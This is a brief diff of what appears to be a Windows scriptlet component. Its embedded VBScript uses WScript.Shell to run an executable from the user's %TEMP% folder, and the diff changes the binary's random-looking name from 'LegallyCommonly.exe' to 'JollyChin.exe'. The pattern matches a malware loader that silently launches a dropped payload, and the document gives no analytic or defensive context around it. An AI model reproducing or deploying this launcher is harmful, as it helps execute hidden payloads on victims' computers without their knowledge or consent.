@@ -2,6 +2,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\LegallyCommonly.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\JollyChin.exe")
 </script>
 </component>
